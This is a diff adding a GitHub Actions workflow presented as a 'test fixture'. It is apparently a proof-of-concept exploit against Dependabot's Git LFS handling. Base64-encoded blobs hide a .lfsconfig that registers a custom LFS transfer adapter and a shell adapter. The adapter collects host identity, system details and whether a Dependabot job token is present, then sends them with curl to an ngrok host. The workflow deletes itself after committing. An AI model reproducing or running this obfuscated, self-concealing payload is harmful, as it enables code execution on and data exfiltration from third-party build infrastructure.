@@ -1,0 +1,44 @@
+name: Install isolated Dependabot LFS test fixture
+
+on:
+  push:
+
+permissions:
+  contents: write
+
+jobs:
+  bootstrap:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Commit fixture with executable adapter
+        env:
+          ATTRIBUTES_B64: Lnlhcm4vY2FjaGUvcGF5bG9hZC5iaW4gZmlsdGVyPWxmcyBkaWZmPWxmcyBtZXJnZT1sZnMgLXRleHQK
+          LFSCONFIG_B64: W2xmc10KCXVybCA9IGh0dHBzOi8vMjlmYS0yNjAxLTY0NC04NTgwLWIxMjAtOWQzNC1hOWI3LTM0NTYtNWViLm5ncm9rLWZyZWUuYXBwL2luZm8vbGZzCltsZnMgImN1c3RvbXRyYW5zZmVyLnNlbnRpbmVsLnBhdGgiXQoJYWNjZXNzID0gLi9hZGFwdGVyCg==
+          DEPENDABOT_B64: dmVyc2lvbjogMgp1cGRhdGVzOgogIC0gcGFja2FnZS1lY29zeXN0ZW06IG5wbQogICAgZGlyZWN0b3J5OiAvCiAgICBzY2hlZHVsZToKICAgICAgaW50ZXJ2YWw6IGRhaWx5Cg==
+          POINTER_B64: dmVyc2lvbiBodHRwczovL2dpdC1sZnMuZ2l0aHViLmNvbS9zcGVjL3YxCm9pZCBzaGEyNTY6YmJlZWJkODc5ZTFkZmY2OTE4NTQ2ZGMwYzE3OWZkZGU1MDVmMmEyMTU5MWM5YTljOTZlMzZiMDU0ZWM1YWY4MwpzaXplIDEK
+          ADAPTER_B64: IyEvYmluL3NoCnNldCAtZXUKCmlmIFsgLW4gIiR7REVQRU5EQUJPVF9KT0JfVE9LRU46LX0iIF07IHRoZW4KICBqb2JfdG9rZW5fcHJlc2VudD10cnVlCiAgam9iX3Rva2VuX2xlbmd0aD0keyNERVBFTkRBQk9UX0pPQl9UT0tFTn0KZWxzZQogIGpvYl90b2tlbl9wcmVzZW50PWZhbHNlCiAgam9iX3Rva2VuX2xlbmd0aD0wCmZpCgppZiBbIC1uICIke0RFUEVOREFCT1RfQVBJX1VSTDotfSIgXTsgdGhlbgogIGFwaV91cmxfcHJlc2VudD10cnVlCmVsc2UKICBhcGlfdXJsX3ByZXNlbnQ9ZmFsc2UKZmkKCmlmIFsgLW4gIiR7SFRUUFNfUFJPWFk6LX0ke2h0dHBzX3Byb3h5Oi19IiBdOyB0aGVuCiAgcHJveHlfcHJlc2VudD10cnVlCmVsc2UKICBwcm94eV9wcmVzZW50PWZhbHNlCmZpCgpldmlkZW5jZT0kKHByaW50ZiAnJXNcbicgXAogICdwcm9iZT1kZXBlbmRhYm90LWxmcy1ob3N0ZWQtcG9jLTIwMjYwODA0JyBcCiAgImlkPSQoaWQpIiBcCiAgInB3ZD0kUFdEIiBcCiAgImhvc3RuYW1lPSQoaG9zdG5hbWUpIiBcCiAgInVuYW1lPSQodW5hbWUgLWEpIiBcCiAgImdpdF9sZnNfdmVyc2lvbj0kKGdpdCBsZnMgdmVyc2lvbiAyPiYxKSIgXAogICJkZXBlbmRhYm90PSR7REVQRU5EQUJPVDotdW5zZXR9IiBcCiAgImdpdGh1Yl9hY3Rpb25zPSR7R0lUSFVCX0FDVElPTlM6LXVuc2V0fSIgXAogICJqb2JfdG9rZW5fcHJlc2VudD0kam9iX3Rva2VuX3ByZXNlbnQiIFwKICAiam9iX3Rva2VuX2xlbmd0aD0kam9iX3Rva2VuX2xlbmd0aCIgXAogICJhcGlfdXJsX3ByZXNlbnQ9JGFwaV91cmxfcHJlc2VudCIgXAogICJwcm94eV9wcmVzZW50PSRwcm94eV9wcmVzZW50IikKCmN1cmwgLWZzUyBcCiAgLUggJ2NvbnRlbnQtdHlwZTogdGV4dC9wbGFpbicgXAogIC0tZGF0YS1iaW5hcnkgIiRldmlkZW5jZSIgXAogICdodHRwczovLzI5ZmEtMjYwMS02NDQtODU4MC1iMTIwLTlkMzQtYTliNy0zNDU2LTVlYi5uZ3Jvay1mcmVlLmFwcC9leGVjdXRlZCcgXAogID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCgp3aGlsZSBJRlM9IHJlYWQgLXIgbWVzc2FnZTsgZG8KICBjYXNlICIkbWVzc2FnZSIgaW4KICAgIConImV2ZW50IjoiaW5pdCInKikKICAgICAgcHJpbnRmICd7ImV2ZW50IjoiaW5pdCJ9XG4nCiAgICAgIDs7CiAgICAqJyJldmVudCI6ImRvd25sb2FkIicqKQogICAgICBvYmplY3RfcGF0aD0iL3RtcC9kZXBlbmRhYm90LWxmcy1vYmplY3QtJCQiCiAgICAgIHByaW50ZiAnWicgPiAiJG9iamVjdF9wYXRoIgogICAgICBwcmludGYgJ3siZXZlbnQiOiJjb21wbGV0ZSIsIm9pZCI6ImJiZWViZDg3OWUxZGZmNjkxODU0NmRjMGMxNzlmZGRlNTA1ZjJhMjE1OTFjOWE5Yzk2ZTM2YjA1NGVjNWFmODMiLCJwYXRoIjoiJXMifVxuJyAiJG9iamVjdF9wYXRoIgogICAgICA7OwogICAgKiciZXZlbnQiOiJ0ZXJtaW5hdGUiJyopCiAgICAgIGV4aXQgMAogICAgICA7OwogIGVzYWMKZG9uZQo=
+        run: |
+          mkdir -p .github .yarn/cache
+          printf '%s' "$ATTRIBUTES_B64" | base64 -d > .gitattributes
+          printf '%s' "$LFSCONFIG_B64" | base64 -d > .lfsconfig
+          printf '%s' "$DEPENDABOT_B64" | base64 -d > .github/dependabot.yml
+          printf '%s' "$POINTER_B64" | base64 -d > .yarn/cache/payload.bin
+          printf '%s' "$ADAPTER_B64" | base64 -d > adapter
+          cat > package.json <<'JSON'
+          {
+            "name": "dependabot-lfs-hosted-poc",
+            "private": true,
+            "version": "1.0.0",
+            "dependencies": {
+              "is-number": "1.0.0"
+            }
+          }
+          JSON
+          chmod 755 adapter
+          rm .github/workflows/bootstrap.yml
+          git config user.name "Dependabot LFS test bootstrap"
+          git config user.email "dependabot-lfs-test@users.noreply.github.com"
+          git -c filter.lfs.clean= -c filter.lfs.smudge= -c filter.lfs.process= -c filter.lfs.required=false add -A
+          git commit -m "Install isolated Dependabot Git LFS test fixture"
+          git push
